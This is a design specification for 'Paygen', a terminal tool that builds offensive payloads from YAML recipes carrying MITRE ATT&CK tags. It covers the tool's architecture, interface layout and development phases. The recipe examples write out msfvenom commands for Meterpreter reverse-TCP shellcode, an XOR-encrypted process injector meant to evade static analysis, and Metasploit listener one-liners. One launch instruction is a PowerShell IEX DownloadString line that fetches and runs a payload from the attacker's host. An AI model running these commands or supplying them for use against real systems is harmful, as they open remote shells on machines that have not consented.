# Paygen - Payload Generation Framework

A menu-driven TUI tool for generating and customizing malicious payloads with MITRE ATT&CK context and effectiveness ratings.

---

## Project Overview

**Repository**: Private GitHub repository (Hailst0rm1/paygen)  
**Language**: Python 3.10+  
**Interface**: Terminal User Interface (TUI)  
**Purpose**: Template-based payload generation with custom preprocessing and categorization

---

## Technical Stack

### Core Technologies

- **Language**: Python 3.10+
- **TUI Framework**: Textual
- **Color Scheme**: Catppuccin Mocha palette
- **Recipe Format**: YAML
- **Templating**: Jinja2 (for source code generation and command rendering)
- **Cryptography**: PyCryptodome (for built-in encryption utilities)

### Key Libraries

- **YAML parsing**: PyYAML
- **Parameter validation**: Custom validators
- **File operations**: pathlib, shutil
- **Templating**: Jinja2
- **Encryption**: PyCryptodome
- **TUI**: Textual, Rich

---

## Architecture

### Directory Structure

```
paygen/
├── ~/.config/paygen/
│   └── config.yaml              # User configuration file
├── src/
│   ├── main.py                  # Entry point
│   ├── tui/
│   │   ├── app.py              # Main TUI application
│   │   ├── category_panel.py  # Left panel: Categories & Recipes
│   │   ├── recipe_panel.py    # Middle panel: Recipe metadata
│   │   ├── code_panel.py      # Right panel: Template/command source
│   │   └── colors.py          # Catppuccin Mocha color definitions
│   ├── core/
│   │   ├── config.py          # Configuration management
│   │   ├── recipe_loader.py   # Load and parse YAML recipes
│   │   ├── payload_builder.py # Generate final payloads
│   │   ├── validator.py       # Parameter validation
│   │   ├── preprocessor.py    # Preprocessing orchestrator
│   │   └── compiler.py        # Source code compilation
│   └── utils/
│       └── templates.py       # Jinja2 template rendering
├── recipes/                     # Recipe YAML definitions (organized by user)
│   ├── process_injection.yaml
│   ├── msfvenom_shell.yaml
│   └── ...
├── payloads/                    # Source code templates
│   └── process_injection/
│       ├── process_injection.cs
│       └── process_injection.ps1
├── preprocessors/               # Custom preprocessing scripts
│   ├── xor_encrypt.py
│   ├── aes_encrypt.py
│   └── shellcode_gen.py        # User can add custom scripts here
├── output/                      # Generated payloads (gitignored)
├── requirements.txt
├── pyproject.toml
├── README.md
└── .gitignore
```

---

## Configuration System

### Location

User configuration is stored at: `~/.config/paygen/config.yaml`

### Configuration Schema

```yaml
# ~/.config/paygen/config.yaml

# Directory paths (can be relative to config location or absolute)
recipes_dir: "~/Documents/Tools/paygen/recipes"
payloads_dir: "~/Documents/Tools/paygen/payloads"
preprocessors_dir: "~/Documents/Tools/paygen/preprocessors"
output_dir: "~/Documents/Tools/paygen/output"

# TUI preferences
theme: "catppuccin_mocha"  # Color scheme
transparent_background: true
```

### Configuration Initialization

- Config file is automatically created on first run if it doesn't exist
- Default paths point to the paygen installation directory
- Users can edit config to customize paths
- All paths are validated on startup

---

## Recipe System

### Recipe Types

Paygen supports two recipe types:

1. **Template-Based**: Uses source code templates (C, C#, PowerShell, etc.) with Jinja2 placeholders
2. **Command-Based**: Executes external tools/commands (msfvenom, sliver, etc.)

### Recipe YAML Structure

All recipes follow this standardized structure with four main sections:

```yaml
# Section 1: Meta - Recipe metadata
meta:
  name: "Recipe Name"
  category: "Process Injection"  # Freeform category (defaults to "Misc" if omitted)
  description: |
    Multi-line description of what this payload does,
    its effectiveness, and use cases.
  
  effectiveness: "high"  # low | medium | high
  
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  
  artifacts:
    - "Artifact 1 that defenders will see"
    - "Artifact 2 for detection"
    - "Artifact 3 for forensics"

# Section 2: Parameters - User inputs
parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP address"
    required: true
    default: ""
  
  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444
  
  - name: "output_file"
    type: "string"
    description: "Output filename"
    required: true
    default: "payload.exe"
  
  - name: "output_path"
    type: "path"
    description: "Output directory path"
    required: true
    default: "{config.output_dir}"  # Pre-filled from config

# Section 3: Preprocessing - Data transformation before template rendering
preprocessing:
  # Preprocessing can be a command OR a script
  
  # Option A: Command-based preprocessing
  - type: "command"
    name: "generate_shellcode"
    command: |
      msfvenom -p windows/x64/meterpreter_reverse_tcp \
        LHOST={{ lhost }} LPORT={{ lport }} \
        -f raw
    output_var: "raw_shellcode"  # Store command output in this variable
  
  # Option B: Script-based preprocessing
  - type: "script"
    name: "encrypt_shellcode"
    script: "preprocessors/xor_encrypt.py"  # Path relative to preprocessors_dir
    args:
      input: "{{ raw_shellcode }}"
      key: "auto"  # Can be auto-generated or user-specified
    output_var: "encrypted_shellcode"  # Script output stored here

# Section 4: Output - Template and compilation/execution
output:
  # For template-based recipes
  type: "template"  # template | command
  template: "payloads/process_injection/process_injection.cs"
  
  # OR for command-based recipes
  # type: "command"
  # command: |
  #   sliver-server generate --http {{ c2_address }} --save {{ output_path }}/{{ output_file }}
  
  # Compilation (optional, only for template-based)
  compile:
    enabled: true
    compiler: "mcs"  # mcs, csc, gcc, x86_64-w64-mingw32-gcc, etc.
    flags: ["-out:{{ output_path }}/{{ output_file }}"]
  
  # Launch instructions shown to user after generation
  launch_instructions: |
    Execute the payload on the target:
    
    # Method 1: Direct execution
    {{ output_file }}
    
    # Method 2: Remote execution
    IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/{{ output_file }}')
```

---

## Template-Based Recipe Example

```yaml
meta:
  name: "C# Process Injection with XOR Encryption"
  category: "Process Injection"
  description: |
    Injects encrypted shellcode into a remote process using C#.
    Uses XOR encryption to evade static analysis.
    Targets Windows x64 systems.
  
  effectiveness: "high"
  
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  
  artifacts:
    - "Process creation with PROCESS_ALL_ACCESS"
    - "VirtualAllocEx and WriteProcessMemory API calls"
    - "CreateRemoteThread execution"
    - "Encrypted shellcode in memory"

parameters:
  - name: "target_process"
    type: "string"
    description: "Target process name (e.g., explorer.exe)"
    required: true
    default: "explorer.exe"
  
  - name: "lhost"
    type: "ip"
    description: "Listener IP address"
    required: true
  
  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444
  
  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (auto-generated if empty)"
    required: false
    default: ""
  
  - name: "output_file"
    type: "string"
    description: "Output filename"
    required: true
    default: "injector.exe"
  
  - name: "output_path"
    type: "path"
    description: "Output directory"
    required: true
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode with msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: |
      msfvenom -p windows/x64/meterpreter_reverse_tcp \
        LHOST={{ lhost }} LPORT={{ lport }} \
        -f raw
    output_var: "raw_shellcode"
  
  # Step 2: Encrypt shellcode with custom XOR script
  - type: "script"
    name: "xor_encryption"
    script: "preprocessors/xor_encrypt.py"
    args:
      shellcode: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"  # Auto-generated if empty
    output_var: "encrypted_data"

output:
  type: "template"
  template: "payloads/process_injection/process_injection.cs"
  
  compile:
    enabled: true
    compiler: "mcs"
    flags:
      - "-out:{{ output_path }}/{{ output_file }}"
      - "-platform:x64"
  
  launch_instructions: |
    Start Metasploit listener:
    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
    
    Execute on target:
    {{ output_file }} {{ target_process }}
```

---

## Command-Based Recipe Example

```yaml
meta:
  name: "Msfvenom Reverse Shell"
  category: "Shellcode Generation"
  description: |
    Generates reverse shell payloads using msfvenom.
    Supports multiple formats and encoding options.
    Medium effectiveness due to known signatures.
  
  effectiveness: "medium"
  
  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059.003 - Windows Command Shell"
  
  artifacts:
    - "Metasploit framework signatures"
    - "Outbound connection to LHOST:LPORT"
    - "Common shellcode patterns"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Listener IP address"
    required: true
  
  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444
  
  - name: "payload_type"
    type: "choice"
    description: "Msfvenom payload type"
    required: true
    choices:
      - "windows/x64/meterpreter_reverse_tcp"
      - "windows/x64/shell_reverse_tcp"
      - "linux/x64/shell_reverse_tcp"
    default: "windows/x64/meterpreter_reverse_tcp"
  
  - name: "format"
    type: "choice"
    description: "Output format"
    required: true
    choices: ["exe", "dll", "raw", "ps1", "python"]
    default: "exe"
  
  - name: "encoder"
    type: "choice"
    description: "Encoder for evasion"
    required: false
    choices: ["none", "x86/shikata_ga_nai", "x64/xor_dynamic"]
    default: "none"
  
  - name: "output_file"
    type: "string"
    description: "Output filename"
    required: true
    default: "payload.exe"
  
  - name: "output_path"
    type: "path"
    description: "Output directory"
    required: true
    default: "{config.output_dir}"

preprocessing: []  # No preprocessing needed

output:
  type: "command"
  command: |
    msfvenom -p {{ payload_type }} \
      LHOST={{ lhost }} LPORT={{ lport }} \
      {% if encoder != 'none' %}-e {{ encoder }} -i 3{% endif %} \
      -f {{ format }} \
      -o {{ output_path }}/{{ output_file }}
  
  launch_instructions: |
    Start Metasploit listener:
    msfconsole -q -x "use exploit/multi/handler; set payload {{ payload_type }}; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
    
    Execute payload on target:
    {{ output_file }}
```

---

## Preprocessing System

### Overview

Preprocessing transforms data before it's injected into templates. There are two types:

1. **Command-based**: Execute external commands (like msfvenom)
2. **Script-based**: Run custom Python scripts from `preprocessors/` directory

### Command-Based Preprocessing

```yaml
preprocessing:
  - type: "command"
    name: "generate_shellcode"
    command: |
      msfvenom -p windows/x64/meterpreter_reverse_tcp \
        LHOST={{ lhost }} LPORT={{ lport }} \
        -f raw
    output_var: "shellcode"  # Output stored in this variable
```

- Command uses Jinja2 templating with parameter values
- Output (stdout) is captured and stored in `output_var`
- Can be used in subsequent preprocessing steps or templates

### Script-Based Preprocessing

```yaml
preprocessing:
  - type: "script"
    name: "xor_encryption"
    script: "preprocessors/xor_encrypt.py"
    args:
      shellcode: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "encrypted_shellcode"
```

- Script receives arguments via command-line or JSON
- Script path is relative to `preprocessors_dir` from config
- Output is captured from stdout and stored in `output_var`

### Built-in Preprocessors

The following preprocessors come with Paygen:

```
preprocessors/
├── xor_encrypt.py       # XOR encryption with auto-key generation
├── aes_encrypt.py       # AES-256-CBC encryption
├── base64_encode.py     # Base64 encoding
├── caesar_cipher.py     # Caesar cipher encryption/decryption
├── compress.py          # Gzip compression
└── format_csharp.py     # Convert bytes to C# byte array
```

### Custom Preprocessor Script Format

Users can create custom preprocessing scripts following this interface:

```python
#!/usr/bin/env python3
"""
Custom preprocessor script template

Input: Command-line arguments or JSON via stdin
Output: Processed data to stdout
"""

import sys
import json

def main():
    # Option 1: Read from command-line args
    if len(sys.argv) > 1:
        input_data = sys.argv[1]
        key = sys.argv[2] if len(sys.argv) > 2 else None
    
    # Option 2: Read JSON from stdin
    else:
        args = json.load(sys.stdin)
        input_data = args.get('input')
        key = args.get('key')
    
    # Process the data
    result = process(input_data, key)
    
    # Output to stdout (will be captured by paygen)
    print(result)

def process(data, key):
    # Your custom processing logic here
    return data

if __name__ == "__main__":
    main()
```

### Preprocessing Flow

1. User parameters are collected
2. Preprocessing steps execute in order
3. Each step can use:
   - User parameters (from `parameters` section)
   - Output from previous preprocessing steps
4. All outputs are available as variables for template rendering
5. Template is rendered with all variables (parameters + preprocessing outputs)
6. Output is compiled/executed according to `output` section

---

## Parameter Types & Validation

| Type      | Validation                | Example                   |
| --------- | ------------------------- | ------------------------- |
| `ip`      | IPv4/IPv6 format          | `192.168.1.100`           |
| `port`    | 1-65535 range             | `4444`                    |
| `string`  | Any text                  | `payload.exe`             |
| `file`    | Path exists (validation)  | `/tmp/shellcode.bin`      |
| `path`    | Directory path            | `./output`                |
| `hex`     | Hexadecimal string        | `deadbeef`                |
| `bool`    | true/false                | `true`                    |
| `choice`  | One from predefined list  | `exe` from [exe,dll,raw]  |
| `integer` | Whole number with range   | `5` (range: [1, 10])      |

---

## TUI Design

### Layout (3-Panel Design)

```
┌──────────────────────────────────────────────────────────────────────┐
│  PAYGEN - Payload Generation Framework                              │
│  Recipes: 15 | Categories: 5                                         │
├─────────────────┬──────────────────────────┬──────────────────────────┤
│                 │                          │                          │
│  LEFT PANEL     │  MIDDLE PANEL            │  RIGHT PANEL             │
│  Categories &   │  Recipe Metadata         │  Template/Command Code   │
│  Recipes        │                          │                          │
│                 │                          │                          │
│ ┌─────────────┐ │  Name: C# Process Inj... │ ```csharp                │
│ │ Categories  │ │  Category: Process Inj... │ using System;            │
│ ├─────────────┤ │                          │ using System.Runtime...  │
│ │► Process... │ │  Effectiveness: [HIGH]   │                          │
│ │  Shellcode  │ │                          │ class Injector {         │
│ │  Web Expl.  │ │  MITRE ATT&CK:           │   static byte[] shell... │
│ │  Misc       │ │  • Tactic: TA0005        │   = { {{ encrypted_...   │
│ └─────────────┘ │  • Technique: T1055      │                          │
│                 │                          │   static void Main()     │
│ ┌─────────────┐ │  Artifacts:              │   {                      │
│ │ Recipes     │ │  • API calls to Virtua...│     // Decrypt shellc... │
│ ├─────────────┤ │  • CreateRemoteThread... │     ...                  │
│ │►[HIGH] C#...│ │                          │   }                      │
│ │ [MED] PS...│ │  Parameters:             │ }                        │
│ │ [MED] XOR...│ │  • lhost (ip) *          │ ```                      │
│ └─────────────┘ │  • lport (port) = 4444   │                          │
│                 │  • output_file (string)  │                          │
│   [G] Generate  │                          │  [TAB] Switch Panel      │
│   [?] Help      │  [ENTER] Configure       │  [↑↓] Scroll             │
└─────────────────┴──────────────────────────┴──────────────────────────┘
```

### Color Scheme: Catppuccin Mocha

```python
# Catppuccin Mocha Palette
COLORS = {
    'rosewater': '#f5e0dc',
    'flamingo': '#f2cdcd',
    'pink': '#f5c2e7',
    'mauve': '#cba6f7',      # Accents, headers
    'red': '#f38ba8',        # Errors, high effectiveness
    'maroon': '#eba0ac',
    'peach': '#fab387',      # Warnings, medium effectiveness
    'yellow': '#f9e2af',     
    'green': '#a6e3a1',      # Success, high effectiveness
    'teal': '#94e2d5',       # Info
    'sky': '#89dceb',
    'sapphire': '#74c7ec',
    'blue': '#89b4fa',       # Links, selections
    'lavender': '#b4befe',   
    'text': '#cdd6f4',       # Primary text
    'subtext1': '#bac2de',   # Secondary text
    'subtext0': '#a6adc8',   
    'overlay2': '#9399b2',   
    'overlay1': '#7f849c',   
    'overlay0': '#6c7086',   
    'surface2': '#585b70',   
    'surface1': '#45475a',   
    'surface0': '#313244',   
    'base': '#1e1e2e',       # Background (or transparent)
    'mantle': '#181825',     
    'crust': '#11111b',      
}

# Usage
- Background: transparent (uses terminal color)
- Panels: borders in 'blue'
- Headers: 'mauve'
- Effectiveness badges:
  - HIGH: 'green'
  - MEDIUM: 'peach'
  - LOW: 'overlay1'
- Selected item: 'blue' background
- Text: 'text' (primary), 'subtext0' (descriptions)
- Errors: 'red'
- Success: 'green'
```

### Navigation & Keybindings

**Global**
- `j`/`k`: Navigate down/up
- `h`/`l` or `Tab`: Switch between panels (left/right)
- `Enter`: Select/Activate
- `Esc` or `Ctrl+c`: Go back/Cancel
- `g`: Generate payload (from recipe detail view)
- `?`: Show help
- `q`: Quit

**Left Panel (Categories & Recipes)**
- `j`/`k`: Navigate categories or recipes down/up
- `Enter` or `l`: Expand category or select recipe
- `/`: Search recipes
- `gg`: Jump to top
- `G`: Jump to bottom

**Middle Panel (Recipe Metadata)**
- `j`/`k`: Scroll down/up
- `Enter`: Open parameter configuration
- `v`: View full description
- `gg`: Jump to top
- `G`: Jump to bottom

**Right Panel (Code View)**
- `j`/`k`: Scroll down/up
- `Ctrl+d`/`Ctrl+u`: Page down/up
- `gg`: Jump to top
- `G`: Jump to bottom

### User Workflow

1. **Browse Categories** (Left Panel)
   - Select a category
   - Categories sorted alphabetically
   - Shows recipe count per category

2. **Browse Recipes** (Left Panel)
   - Recipes sorted by effectiveness (HIGH → MEDIUM → LOW)
   - Then alphabetically within same effectiveness
   - Effectiveness badge color-coded

3. **View Recipe Details** (Middle Panel)
   - Name, category, description
   - Effectiveness rating
   - MITRE ATT&CK mapping
   - Artifacts list
   - Parameters with types and defaults

4. **View Source Code** (Right Panel)
   - For template recipes: Shows the actual template code
   - For command recipes: Shows the command that will be executed
   - Syntax highlighting based on file type

5. **Configure & Generate** (Parameter Input Screen)
   - Press `Enter` on a recipe or `g` anywhere
   - Fill in required parameters
   - Optional parameters have defaults pre-filled
   - Output path pre-filled from config
   - Validate inputs in real-time
   - Press `Enter` to generate

6. **View Results** (Results Screen)
   - Shows build progress
   - Displays success/error messages
   - Shows output file path and size
   - Displays launch instructions
   - Option to copy launch instructions

---

## Implementation Phases

### Phase 1: Core Infrastructure ✅

- [x] Set up Python project structure
- [x] Create requirements.txt and pyproject.toml
- [x] Implement configuration system (~/.config/paygen/config.yaml)
- [x] Create recipe YAML schema and validator
- [x] Implement recipe loader
- [x] Build parameter validation system
- [x] Create Jinja2 template renderer

### Phase 2: Preprocessing System ✅

- [x] Implement preprocessing orchestrator
- [x] Create built-in preprocessors:
  - [x] xor_encrypt.py
  - [x] aes_encrypt.py
  - [x] base64_encode.py
  - [x] caesar_cipher.py
  - [x] compress.py
  - [x] format_csharp.py
- [x] Add command execution for preprocessing
- [x] Add script execution for preprocessing
- [x] Implement output variable management

### Phase 3: TUI Development ✅

- [x] Set up Textual application with Catppuccin Mocha theme
- [x] Implement transparent background (uses terminal background)
- [x] Create 3-panel layout
- [x] Build left panel (categories & recipes)
  - [x] Category navigation
  - [x] Recipe listing with effectiveness badges
  - [x] Sorting (effectiveness → alphabetical)
- [x] Build middle panel (recipe metadata)
  - [x] Display name, description, effectiveness
  - [x] Show MITRE ATT&CK info
  - [x] List artifacts
  - [x] Show parameters with defaults
- [x] Build right panel (code view)
  - [x] Template source display
  - [x] Command display
  - [x] Syntax highlighting
  - [x] Scroll functionality
- [x] Implement navigation and keybindings
  - [x] Vim-style navigation (j/k/h/l)
  - [x] Panel focus indicators (double border)
  - [x] Help screen with full documentation
- [x] Enable text selection and copying (mouse=False mode)
- [x] Auto-focus on startup
- [x] Fast scrolling (5 lines per keypress)

### Phase 4: Parameter Configuration & UI Transitions

**Layout Design:**
- When user presses 'g', the layout shifts:
  - Left panel (Categories): Stays visible (30% width)
  - Middle panel: Recipe Details → Parameter Configuration (35% width)
  - Right panel: Code Preview → Build Output/Logs (35% width)

**Parameter Configuration UI (Middle Panel):**
- [ ] Create base parameter configuration screen
- [ ] Implement parameter input widgets by type:
  - [ ] Text input for string, ip, port, path, hex
  - [ ] Dropdown/select for choice type
  - [ ] Checkbox for boolean type
  - [ ] Number input for integer type with range validation
- [ ] Pre-fill defaults from recipe and config
- [ ] Real-time validation with error messages
- [ ] Required field indicators (*)
- [ ] "Generate" and "Cancel" buttons at bottom
- [ ] Panel layout switching system (recipe details ↔ parameter config)

### Phase 5: Build System & Payload Generation

**Build Orchestrator:**
- [ ] Implement payload builder orchestrator
- [ ] Execute preprocessing steps in sequence
  - [ ] Command execution (e.g., msfvenom)
  - [ ] Script execution (e.g., xor_encrypt.py, aes_encrypt.py)
  - [ ] Variable management across steps
- [ ] Template rendering with all variables (parameters + preprocessing outputs)
- [ ] Implement compilation support:
  - [ ] C/C++ compilation (gcc, mingw-w64)
  - [ ] C# compilation (mcs, csc)
  - [ ] Other compilers as needed
- [ ] Command execution for command-based recipes
- [ ] Output file management

**Build Output UI (Right Panel):**
- [ ] Create real-time log viewer widget
- [ ] Show build logs as preprocessing executes
- [ ] Display each step with status:
  - [ ] "Running: msfvenom..." with output
  - [ ] "Encrypting with AES..." with progress
  - [ ] "Compiling with mcs..." with compiler output
- [ ] Color-coded success/error messages
- [ ] Display final output file path and size
- [ ] Show launch instructions with actual values filled in
- [ ] "Copy Instructions" button
- [ ] "Close" button to return to recipe browsing

### Phase 6: History & Session Management

**History System:**
- [ ] Create history data structure
- [ ] Track all generated payloads:
  - [ ] Recipe name
  - [ ] Timestamp
  - [ ] Parameters used
  - [ ] Output file path
  - [ ] Build success/failure status
  - [ ] Launch instructions
- [ ] Persist history to ~/.config/paygen/history.json
- [ ] Load history on startup

**History UI:**
- [ ] New keybinding 'H' to open history panel
- [ ] History panel replaces middle panel temporarily
- [ ] Display history entries (newest first):
  - [ ] Date/time
  - [ ] Recipe name
  - [ ] Status (✓ success / ✗ failed)
  - [ ] Output file
- [ ] Select entry to view full details:
  - [ ] All parameters used
  - [ ] Build logs
  - [ ] Launch instructions
- [ ] Actions on history entries:
  - [ ] Regenerate with same parameters
  - [ ] Copy launch instructions
  - [ ] Delete entry
  - [ ] Open output directory
- [ ] Search/filter history by recipe name, date, status

### Phase 7: Recipe Development (Together)

- [ ] Create process injection recipe (C#)
- [ ] Create process injection recipe (PowerShell)
- [ ] Create msfvenom shellcode recipe
- [ ] Create additional recipes based on user needs
- [ ] Test all recipes end-to-end

### Phase 8: Polish & Distribution

- [ ] Add comprehensive error handling
- [ ] Improve user feedback and progress indicators
- [ ] Create README with usage instructions
- [ ] Add .gitignore for output directory
- [ ] Set up Nix packaging (optional)
- [ ] Create demo/tutorial

---

## Security & OpSec Considerations

- **Output directory**: Always in .gitignore (never commit payloads)
- **Sensitive parameters**: Not logged or displayed in error messages
- **Custom scripts**: User responsibility for script security
- **Compilation**: Support cross-compilation to avoid needing Windows VM
- **Encryption keys**: Auto-generated by default when empty
- **Source control**: All recipes in private repo

---

## Future Enhancements

- [ ] Recipe import/export functionality
- [ ] Built-in listener management (Metasploit, Sliver)
- [ ] Docker containerization for isolated compilation
- [ ] Recipe versioning and updates
- [ ] OPSEC scoring system for payloads
- [ ] Integration with C2 frameworks
- [ ] Payload obfuscation plugins
- [ ] Multi-stage payload generation
- [ ] Recipe templates for quick creation
